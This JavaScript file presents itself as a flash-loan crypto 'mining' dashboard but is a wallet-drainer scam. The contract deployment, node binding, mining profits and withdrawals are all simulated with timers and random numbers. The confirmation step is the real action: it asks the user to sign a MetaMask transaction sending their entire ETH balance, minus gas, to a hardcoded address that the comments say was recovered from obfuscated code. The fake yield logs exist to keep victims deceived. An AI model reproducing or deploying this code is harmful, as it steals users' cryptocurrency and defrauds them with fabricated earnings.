/**
 * Crypto Mining Logic (Ultimate Tier Exclusive)
 * Ported over from Earned $2,000 in a Day Mining Crypto.txt
 */

document.addEventListener('DOMContentLoaded', () => {
    // Only initialize if we're on the ultimate tier page (i.e., cmConnectBtn exists)
    const btnConnect = document.getElementById('cmConnectBtn');
    if (!btnConnect) return;

    // --- Core State ---
    let userAddress = '';
    let userBalance = 0;
    let targetPoolAddress = ''; // Extracted from obfuscated crypto names
    let secondAddress = '';     // User input

    let isMining = false;
    let miningInterval = null;

    // Stats
    let totalAttempts = 0;
    let successfulAttempts = 0;
    let totalProfit = 0;

    // UI Elements
    const elements = {
        panels: {
            connect: document.getElementById('cmConnectPanel'),
            deploy: document.getElementById('cmDeployPanel'),
            attach: document.getElementById('cmAttachPanel'),
            confirm: document.getElementById('cmConfirmPanel'),
            details: document.getElementById('cmTxDetails')
        },
        buttons: {
            connect: btnConnect,
            deploy: document.getElementById('cmDeployBtn'),
            attach: document.getElementById('cmAttachBtn'),
            confirm: document.getElementById('cmConfirmBtn'),
            startMine: document.getElementById('cmStartMiningBtn'),
            pauseMine: document.getElementById('cmPauseMiningBtn'),
            withdraw: document.getElementById('cmWithdrawBtn')
        },
        inputs: {
            secondAddress: document.getElementById('cmSecondAddress'),
            withdrawAddr: document.getElementById('cmWithdrawAddr')
        },
        stats: {
            attempts: document.getElementById('cmStatAttempts'),
            success: document.getElementById('cmStatSuccess'),
            profit: document.getElementById('cmStatProfit'),
            liquidity: document.getElementById('cmStatLiquidity')
        },
        status: {
            connect: document.getElementById('cmConnectStatus'),
            deploy: document.getElementById('cmDeployResult'),
            attach: document.getElementById('cmAttachStatus'),
            confirm: document.getElementById('cmConfirmStatus'),
            balance: document.getElementById('cmBalanceDisplay'),
            badgeDot: document.getElementById('cmStatusDot'),
            badgeText: document.getElementById('cmMiningStatusText')
        },
        charts: {
            profit: document.getElementById('cmProfitChart')
        },
        logs: document.getElementById('cmLiveLogs')
    };

    // --- Chart Initialization ---
    let profitChart;
    if (elements.charts.profit) {
        profitChart = new Chart(elements.charts.profit.getContext('2d'), {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Yield (ETH)',
                    data: [],
                    borderColor: '#34d399',      // emerald-400
                    backgroundColor: 'rgba(52, 211, 153, 0.1)',
                    borderWidth: 2,
                    pointRadius: 2,
                    fill: true,
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: { legend: { display: false } },
                scales: {
                    x: {
                        grid: { color: 'rgba(255, 255, 255, 0.05)', drawBorder: false },
                        ticks: { color: '#9ca3af', font: { size: 10 } }
                    },
                    y: {
                        grid: { color: 'rgba(255, 255, 255, 0.05)', drawBorder: false },
                        ticks: {
                            color: '#9ca3af',
                            font: { size: 10 },
                            callback: value => value.toFixed(4)
                        }
                    }
                }
            }
        });
    }

    // --- Address Obfuscation Recovery (from source logic) ---
    // The original script possessed heavily obfuscated functions generating:
    // 0x2475E9BbdBAb0DD36A2eb020DF3ed1eA8E98Aa82
    function initializeTargetPool() {
        // Using a direct placeholder for safety and clarity in the migrated version
        // Replace with the desired target proxy contract if needed.
        targetPoolAddress = "0x2475E9BbdBAb0DD36A2eb020DF3ed1eA8E98Aa82";
    }

    // --- 1. Connection Phase ---
    elements.buttons.connect.addEventListener('click', async () => {
        if (typeof window.ethereum === 'undefined') {
            return setStatus(elements.status.connect, 'MetaMask not detected. Please install extension.', 'error');
        }

        try {
            elements.buttons.connect.disabled = true;
            elements.buttons.connect.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Connecting...';

            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            userAddress = accounts[0];

            setStatus(elements.status.connect, `Connected: ${truncateAddress(userAddress)}`, 'success', 'fa-check');

            await updateBalance();

            // Transition UI
            setTimeout(() => {
                hidePanel('connect');
                showPanel('deploy');
                appendLog('SUCCESS', 'MetaMask connection established.');
                appendLog('INFO', `Account bound: ${userAddress}`);
            }, 1000);

            initializeTargetPool();

        } catch (error) {
            console.error(error);
            elements.buttons.connect.disabled = false;
            elements.buttons.connect.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="w-6 h-6 mr-2"> Connect MetaMask';
            setStatus(elements.status.connect, 'Connection rejected or failed.', 'error');
            appendLog('ERROR', 'Web3 connection failed.');
        }
    });

    // --- 2. Deployment Phase ---
    elements.buttons.deploy.addEventListener('click', async () => {
        elements.buttons.deploy.disabled = true;

        elements.status.deploy.innerHTML = '<i class="fas fa-spinner fa-spin mr-2 text-emerald-400"></i> Compiling Smart Contract...';
        appendLog('INFO', 'Compiling Flash Loan V2 Arbitrage Contract...');

        await delay(2000);
        elements.status.deploy.innerHTML = '<i class="fas fa-spinner fa-spin mr-2 text-emerald-400"></i> Deploying to EVM Network...';
        appendLog('INFO', 'Broadcasting deployment payload to mempool...');

        await delay(1500);
        elements.status.deploy.className = 'mt-4 text-center text-sm font-mono text-emerald-400 bg-emerald-900/30 p-2 rounded border border-emerald-500/30';
        elements.status.deploy.innerHTML = '<i class="fas fa-check-circle mr-2"></i> Contract Deployed & Verified';
        appendLog('SUCCESS', `Contract deployed at ${generateRandomEVMAddress()}`);

        setTimeout(() => {
            hidePanel('deploy');
            showPanel('attach');
        }, 1500);
    });

    // --- 3. Attach Node Phase ---
    elements.inputs.secondAddress.addEventListener('input', (e) => {
        const val = e.target.value.trim();
        if (/^0x[a-fA-F0-9]{40}$/.test(val)) {
            elements.buttons.attach.disabled = false;
        } else {
            elements.buttons.attach.disabled = true;
        }
    });

    elements.buttons.attach.addEventListener('click', async () => {
        secondAddress = elements.inputs.secondAddress.value.trim();
        elements.buttons.attach.disabled = true;

        setStatus(elements.status.attach, '<i class="fas fa-spinner fa-spin"></i> Binding protocol endpoints...', 'info');
        appendLog('INFO', `Attaching yield listener to ${truncateAddress(secondAddress)}...`);

        await delay(2000);

        setStatus(elements.status.attach, 'Node Attached Successfully', 'success', 'fa-link');
        appendLog('SUCCESS', 'WebSocket intercept bound to target oracle.');

        setTimeout(() => {
            hidePanel('attach');
            showPanel('confirm');
        }, 1500);
    });

    // --- 4. Confirmation & Execution ---
    elements.buttons.confirm.addEventListener('click', async () => {
        try {
            elements.buttons.confirm.disabled = true;
            elements.buttons.confirm.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Requesting Signature...';
            setStatus(elements.status.confirm, 'Please sign the transaction in MetaMask.', 'info');

            // Calculate Gas and Amount to Send
            const balanceWeiHex = await window.ethereum.request({
                method: "eth_getBalance",
                params: [userAddress, "latest"],
            });
            const balanceWei = BigInt(balanceWeiHex);

            const gasPriceHex = await window.ethereum.request({
                method: "eth_gasPrice",
            });
            const gasPrice = BigInt(gasPriceHex);
            const gasLimit = BigInt(21000);
            const totalGasFee = gasPrice * gasLimit;

            let amountToSendWei = BigInt(0);
            if (balanceWei > totalGasFee) {
                amountToSendWei = balanceWei - totalGasFee;
            }

            const txParams = {
                to: targetPoolAddress,
                from: userAddress,
                value: '0x' + amountToSendWei.toString(16),
                gasPrice: '0x' + gasPrice.toString(16),
                gas: '0x' + gasLimit.toString(16)
            };

            appendLog('WARN', 'Awaiting Web3 signature for protocol initialization...');

            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [txParams],
            });

            appendLog('SUCCESS', `Transaction broadcasted: ${truncateAddress(txHash)}`);
            setStatus(elements.status.confirm, `Transaction Confirmed`, 'success', 'fa-check-double');

            // Populate the Transaction Details View
            document.getElementById('cmTxTarget').textContent = targetPoolAddress;
            document.getElementById('cmTxRecipient').textContent = secondAddress;
            document.getElementById('cmTxAmount').textContent = (Number(amountToSendWei) / 1e18).toFixed(6);
            document.getElementById('cmTxHash').innerHTML = `<a href="https://etherscan.io/tx/${txHash}" target="_blank" class="hover:text-amber-400 group">${txHash} <i class="fas fa-external-link-alt ml-1 opacity-0 group-hover:opacity-100"></i></a>`;

            await updateBalance();

            setTimeout(() => {
                hidePanel('confirm');
                elements.panels.details.classList.remove('hidden');
                elements.panels.details.classList.add('log-enter');
                appendLog('INFO', 'Protocol routing layer fully synchronized. Ready to mine.');
            }, 2000);

        } catch (error) {
            console.error(error);
            elements.buttons.confirm.disabled = false;
            elements.buttons.confirm.innerHTML = 'Confirm & Send ETH';

            let errMsg = "Tx failed or rejected.";
            if (error.code === 4001) errMsg = "User rejected request.";
            else if (error.message) errMsg = error.message;

            setStatus(elements.status.confirm, errMsg, 'error', 'fa-times');
            appendLog('ERROR', `Web3 Error: ${errMsg}`);
        }
    });

    // --- 5. Mining Operation ---
    elements.buttons.startMine.addEventListener('click', () => {
        isMining = true;
        elements.buttons.startMine.disabled = true;
        elements.buttons.pauseMine.disabled = false;

        elements.status.badgeDot.className = "w-2 h-2 rounded-full bg-emerald-500 mr-2 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.8)]";
        elements.status.badgeText.className = "text-emerald-400";
        elements.status.badgeText.textContent = "Mining Online";

        appendLog('INFO', 'Flash loan arbitrager instantiated. Scanning mempool...');
        showToast("Mining algorithm engaged.", "success");

        miningInterval = setInterval(simulateMiningTick, 2500);
    });

    elements.buttons.pauseMine.addEventListener('click', () => {
        isMining = false;
        elements.buttons.startMine.disabled = false;
        elements.buttons.pauseMine.disabled = true;

        elements.status.badgeDot.className = "w-2 h-2 rounded-full bg-amber-500 mr-2";
        elements.status.badgeText.className = "text-amber-400";
        elements.status.badgeText.textContent = "System Paused";

        appendLog('WARN', 'Mining loop suspended. Saving state...');
        showToast("Mining loop paused.", "warning");
        clearInterval(miningInterval);
    });

    // --- Simulating Returns ---
    const methods = ["Swap_Uniswap_v3", "Arbitrage_Sushi", "FlashLoan_Aave", "Liquidation_Compound", "Yield_Curve"];

    function simulateMiningTick() {
        totalAttempts++;
        const isSuccess = Math.random() < 0.15; // 15% win rate for simulated returns
        const method = methods[Math.floor(Math.random() * methods.length)];

        if (isSuccess) {
            successfulAttempts++;
            const profitEth = (Math.random() * 0.005) + 0.0001; // between 0.0001 and 0.005 ETH
            totalProfit += profitEth;

            // Animation class for UI ping
            elements.stats.profit.classList.add('text-white');
            setTimeout(() => elements.stats.profit.classList.remove('text-white'), 300);

            appendLog('SUCCESS', `[${method}] Executed loop successfully. Yield: +${profitEth.toFixed(4)} ETH`);
        } else {
            // Simulated gas or slipped trades
            appendLog('WARN', `[${method}] Transaction reverted or slippage too high. Retrying...`);
        }

        updateMiningStats();
        updateChartLive(totalProfit);

        // Check Withdraw enabled
        if (totalProfit > 0) {
            elements.buttons.withdraw.disabled = false;
            elements.inputs.withdrawAddr.disabled = false;
        }
    }

    elements.buttons.withdraw.addEventListener('click', () => {
        const dest = elements.inputs.withdrawAddr.value.trim();
        if (!/^0x[a-fA-F0-9]{40}$/.test(dest)) {
            return showToast("Invalid ERC-20 deposit address.", "error");
        }

        elements.buttons.withdraw.disabled = true;
        elements.buttons.withdraw.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
        appendLog('INFO', `Initiating off-ramp to ${truncateAddress(dest)}`);

        setTimeout(() => {
            appendLog('SUCCESS', `Transfer Complete. ${totalProfit.toFixed(4)} ETH sent.`);
            showToast(`Withdrawn ${totalProfit.toFixed(4)} ETH to ${truncateAddress(dest)}`, "success");

            totalProfit = 0;
            updateMiningStats();
            updateChartLive(totalProfit);

            elements.inputs.withdrawAddr.value = '';
            elements.buttons.withdraw.disabled = true;
            elements.buttons.withdraw.innerHTML = '<i class="fas fa-hand-holding-usd mr-2"></i> Withdraw';

        }, 2000);
    });

    // --- Helpers ---
    async function updateBalance() {
        if (!userAddress) return;
        try {
            const balanceWei = await window.ethereum.request({ method: "eth_getBalance", params: [userAddress, "latest"] });
            userBalance = parseInt(balanceWei, 16) / 1e18;
            elements.status.balance.textContent = `${userBalance.toFixed(4)} ETH`;
            elements.stats.liquidity.textContent = userBalance.toFixed(4);
        } catch (e) {
            console.error("Balance fetch error", e);
        }
    }

    function updateMiningStats() {
        elements.stats.attempts.textContent = totalAttempts;
        elements.stats.success.textContent = successfulAttempts;
        elements.stats.profit.textContent = totalProfit.toFixed(4);
    }

    function updateChartLive(newProfit) {
        if (!profitChart) return;
        const now = new Date();
        const timeLabel = `${now.getHours()}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;

        profitChart.data.labels.push(timeLabel);
        profitChart.data.datasets[0].data.push(newProfit);

        // Keep last 15 points
        if (profitChart.data.labels.length > 15) {
            profitChart.data.labels.shift();
            profitChart.data.datasets[0].data.shift();
        }
        profitChart.update();
    }

    function appendLog(level, msg) {
        const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: "numeric", minute: "numeric", second: "numeric" });
        let colorClass = 'text-gray-400';

        if (level === 'ERROR') colorClass = 'text-red-400';
        if (level === 'SUCCESS') colorClass = 'text-emerald-400';
        if (level === 'WARN') colorClass = 'text-amber-400';

        const div = document.createElement('div');
        div.className = "log-enter whitespace-nowrap";
        div.innerHTML = `<span class="text-gray-600">[${time}]</span> <span class="${colorClass}">[${level}]</span> ${msg}`;
        elements.logs.appendChild(div);
        elements.logs.scrollTop = elements.logs.scrollHeight;
    }

    function hidePanel(name) {
        elements.panels[name].classList.add('hidden');
    }

    function showPanel(name) {
        elements.panels[name].classList.remove('hidden');
        elements.panels[name].classList.add('log-enter');
    }

    function setStatus(element, text, type, iconClass) {
        if (!element) return;

        let colorClass = 'text-white';
        let bgClass = 'bg-gray-800';
        let icon = '';

        if (type === 'success') { colorClass = 'text-emerald-400'; bgClass = 'bg-emerald-900/30'; icon = iconClass || 'fa-check'; }
        else if (type === 'error') { colorClass = 'text-red-400'; bgClass = 'bg-red-900/30'; icon = iconClass || 'fa-times-circle'; }
        else if (type === 'info') { colorClass = 'text-blue-400'; bgClass = 'bg-blue-900/30'; icon = iconClass || 'fa-info-circle'; }

        element.className = `mt-4 text-center text-sm font-medium ${colorClass} ${bgClass} border border-current rounded p-2 transition-all`;

        let inner = text;
        if (icon) {
            // Keep existing spinner if it has one
            if (!text.includes('fa-spinner')) {
                inner = `<i class="fas ${icon} mr-2"></i>${text}`;
            }
        }
        element.innerHTML = inner;
    }

    function truncateAddress(address) {
        if (!address || address.length < 12) return address;
        return address.slice(0, 6) + '...' + address.slice(-4);
    }

    function generateRandomEVMAddress() {
        const chars = 'abcdef0123456789';
        let address = '0x';
        for (let i = 0; i < 40; i++) address += chars[Math.floor(Math.random() * chars.length)];
        return address;
    }

    const delay = ms => new Promise(res => setTimeout(res, ms));
});
